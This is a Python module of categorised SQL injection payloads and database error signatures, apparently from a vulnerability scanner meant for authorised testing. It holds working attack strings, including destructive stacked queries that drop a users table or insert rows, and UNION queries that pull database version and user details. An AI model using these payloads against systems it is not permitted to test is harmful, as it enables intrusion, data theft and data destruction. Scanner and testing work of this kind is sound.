"""
SQL Injection payloads organised by category.
These are used for active testing only against targets you own or have permission to test.
"""

# ── Error-based payloads ──────────────────────────────────────────────────────
ERROR_BASED: list[str] = [
    "'",
    "''",
    "`",
    "\"",
    "\\",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'/*",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "') OR ('1'='1",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "1 ORDER BY 1--",
    "1 ORDER BY 2--",
    "1 ORDER BY 3--",
    "' GROUP BY columnnames HAVING 1=1--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
]

# ── Boolean-based blind payloads ──────────────────────────────────────────────
BOOLEAN_BASED: list[str] = [
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND 'x'='x",
    "' AND 'x'='y",
    "1 AND 1=1",
    "1 AND 1=2",
    "' AND 1=1#",
    "' AND 1=2#",
    "' AND SLEEP(0)--",
    "1' AND '1'='1",
    "1' AND '1'='2",
]

# ── Time-based blind payloads ─────────────────────────────────────────────────
TIME_BASED: list[str] = [
    "'; WAITFOR DELAY '0:0:5'--",          # MSSQL
    "'; SELECT SLEEP(5)--",                # MySQL
    "' OR SLEEP(5)--",
    "1; WAITFOR DELAY '0:0:5'--",
    "1; SELECT SLEEP(5)--",
    "'; SELECT pg_sleep(5)--",             # PostgreSQL
    "' OR pg_sleep(5)--",
    "1 OR SLEEP(5)=0 LIMIT 1--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
]

# ── UNION-based payloads ──────────────────────────────────────────────────────
UNION_BASED: list[str] = [
    "' UNION SELECT 1--",
    "' UNION SELECT 1,2--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT 1,2,3,4--",
    "' UNION ALL SELECT NULL--",
    "' UNION ALL SELECT NULL,NULL--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    "' UNION SELECT @@version--",
    "' UNION SELECT user()--",
    "' UNION SELECT database()--",
]

# ── Out-of-band / stacked queries ─────────────────────────────────────────────
STACKED: list[str] = [
    "'; DROP TABLE users--",
    "'; INSERT INTO users VALUES('hacked','hacked')--",
    "1; DROP TABLE users--",
]

# ── All payloads combined (default for scanning) ──────────────────────────────
ALL_PAYLOADS: list[str] = (
    ERROR_BASED + BOOLEAN_BASED + TIME_BASED + UNION_BASED
)

# ── Error signatures to detect in responses ──────────────────────────────────
SQL_ERROR_SIGNATURES: list[str] = [
    # MySQL
    "you have an error in your sql syntax",
    "warning: mysql",
    "mysql_fetch",
    "mysql_num_rows",
    "mysql_query",
    "supplied argument is not a valid mysql",
    # MSSQL
    "unclosed quotation mark after the character string",
    "incorrect syntax near",
    "microsoft ole db provider for sql server",
    "odbc sql server driver",
    "mssql_query()",
    "syntax error converting",
    # Oracle
    "ora-01756",
    "ora-00933",
    "ora-00907",
    "oracle error",
    "oracle.*driver",
    # PostgreSQL
    "pg_query()",
    "pg_exec()",
    "postgresql.*error",
    "warning.*pg_",
    "valid postgresql result",
    # SQLite
    "sqlite_",
    "sqlite3::",
    "sqlite error",
    # Generic
    "sql syntax",
    "sql error",
    "database error",
    "db error",
    "syntax error",
    "unexpected end of sql command",
    "quoted string not properly terminated",
    "division by zero",
]

# ── Patterns that suggest blind boolean difference ────────────────────────────
BLIND_DIFFERENCE_THRESHOLD = 0.1   # 10 % length difference triggers suspicion
TIME_DELAY_THRESHOLD = 4.0         # seconds
